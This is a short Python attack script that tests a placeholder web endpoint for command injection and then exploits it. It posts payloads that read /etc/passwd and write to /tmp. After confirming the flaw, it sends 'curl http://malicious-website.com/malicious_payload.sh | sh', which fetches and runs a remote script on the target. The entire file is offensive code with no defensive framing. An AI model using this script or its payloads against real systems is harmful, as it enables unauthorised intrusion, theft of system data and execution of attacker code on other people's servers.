import requests

# Target URL and payloads
TARGET_URL = 'http://vulnerable-website.com/execute'
PAYLOADS = [
    "id; whoami",  # Command to get user ID and username
    "ls; cat /etc/passwd",  # List directory contents and view passwd file
    "echo vulnerable > /tmp/compromised.txt",  # Write to a file
    "curl http://malicious-website.com/malicious_payload"  # Download a payload
]

def send_payload(url, payload):
    # Send the payload to the target URL
    response = requests.post(url, data={'command': payload})
    return response

def check_command_injection(url):
    for payload in PAYLOADS:
        response = send_payload(url, payload)
        # Output response for debugging
        print(f"Payload: {payload}\nResponse: {response.text}\n")
        if "vulnerable" in response.text or "compromised" in response.text:
            print(f"Command injection vulnerability found with payload: {payload}")
            return True
    return False

def perform_command_injection_attack():
    # Check if command injection vulnerability exists
    if check_command_injection(TARGET_URL):
        print("Command injection vulnerability confirmed. Executing attack...")
        # Execute a malicious payload
        malicious_payload = "curl http://malicious-website.com/malicious_payload.sh | sh"
        response = send_payload(TARGET_URL, malicious_payload)
        print("Command injection attack executed.")
    else:
        print("No command injection vulnerability found.")

perform_command_injection_attack()
